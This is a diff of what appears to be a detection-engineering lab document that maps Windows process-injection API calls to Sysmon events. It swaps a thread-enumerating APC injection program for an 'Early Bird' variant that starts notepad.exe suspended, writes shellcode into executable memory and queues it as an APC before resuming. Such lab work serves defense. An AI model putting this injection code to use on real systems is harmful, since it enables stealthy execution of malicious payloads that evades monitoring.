@@ -147,7 +147,6 @@ int main() {
         return 1;
     }
     wprintf(L"[+] Remote thread created\n");
-    wprintf(L"[*] Watch Elastic for EID 8 and EID 10\n");
 
     WaitForSingleObject(hThread, 5000);
     CloseHandle(hThread);
@@ -362,8 +361,6 @@ int main() {
         return 1;
     }
     wprintf(L"[+] Remote thread created\n");
-    wprintf(L"[*] Watch Elastic for EID 8 and EID 10\n");
-
 
     WaitForSingleObject(hThread, 5000);
     CloseHandle(hThread);
@@ -484,8 +481,8 @@ DestinationPortName: -"
   EID 8 the injected thread is the one making subsequent API calls. Direct forensic link between thread creation and post-injection activity.
 
 
-## 3. APC Injections
-Queues a function call to an existing thread in the target process rather than creating a new thread. For APC to execute the target thread must enter an alertable wait state via SleepEx, WaitForSingleObjectEx or similar.
+## 3. APC Queue Code Injection
+Threads can execute code asynchronously by leveraging APC queues. It queues a function call to an existing thread in the target process rather than creating a new thread. For APC to execute the target thread must enter an alertable wait state via SleepEx, WaitForSingleObjectEx or similar and cannot force the victim thread to execute the injected code.
 | API Call            | Layer      | Sysmon Event |
 |---------------------|------------|--------------|
 | OpenProcess()       | Win32      | EID 10       |
@@ -495,74 +492,51 @@ Queues a function call to an existing thread in the target process rather than c
 | QueueUserAPC()      | Win32      | -            |
 
 ```
-// t3_apc_injection.cpp
+// t3_apc_earlybird.cpp
 #include "common.h"
 
 int main() {
-    DWORD pid = GetPID(L"notepad.exe");
-    if (!pid) {
-        wprintf(L"[-] notepad.exe not found\n");
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+
+    // Create suspended — thread alertable during init
+    if (!CreateProcessW(
+        L"C:\\Windows\\System32\\notepad.exe",
+        NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED,
+        NULL, NULL, &si, &pi)) {
+        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
         return 1;
     }
-    wprintf(L"[*] Target PID: %lu\n", pid);
+    wprintf(L"[*] Created suspended PID: %lu TID: %lu\n",
+            pi.dwProcessId, pi.dwThreadId);
 
-    // EID 10 fires here
-    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProc) {
-        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
-        return 1;
-    }
-    wprintf(L"[+] Handle acquired\n");
-
+    // Allocate and write shellcode
     LPVOID remoteMem = VirtualAllocEx(
-        hProc, NULL, shellcode_size,
+        pi.hProcess, NULL, shellcode_size,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE
     );
-    if (!remoteMem) {
-        wprintf(L"[-] VirtualAllocEx failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
-
     SIZE_T written = 0;
-    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
-        wprintf(L"[-] WriteProcessMemory failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Shellcode written: %zu bytes\n", written);
+    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_size, &written);
+    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n", written, remoteMem);
 
-    // Enumerate threads of target and queue APC to each
-    // No new thread created — no EID 8
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    THREADENTRY32 te = { sizeof(te) };
-    int queued = 0;
+    // Queue APC to the main thread before it runs
+    // Thread is alertable during early initialization
+    DWORD result = QueueUserAPC(
+        (PAPCFUNC)remoteMem,
+        pi.hThread,
+        NULL
+    );
+    wprintf(L"[+] APC queued: %lu\n", result);
 
-    if (Thread32First(snap, &te)) {
-        do {
-            if (te.th32OwnerProcessID == pid) {
-                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
-                if (hThread) {
-                    DWORD result = QueueUserAPC(
-                        (PAPCFUNC)remoteMem,
-                        hThread,
-                        NULL
-                    );
-                    if (result) {
-                        wprintf(L"[+] APC queued to thread %lu\n", te.th32ThreadID);
-                        queued++;
-                    }
-                    CloseHandle(hThread);
-                }
-            }
-        } while (Thread32Next(snap, &te) && queued < 5);
-    }
-    CloseHandle(snap);
-    CloseHandle(hProc);
+    // Resume — thread executes APC before anything else
+    ResumeThread(pi.hThread);
+    wprintf(L"[*] Thread resumed — APC executes during init\n");
 
-    wprintf(L"[+] APC queued to %d threads\n", queued);
-    wprintf(L"[*] EID 8 should NOT appear\n");
-    wprintf(L"[*] Shellcode executes when thread enters alertable wait\n");
+    WaitForSingleObject(pi.hProcess, 5000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     return 0;
 }
 ```
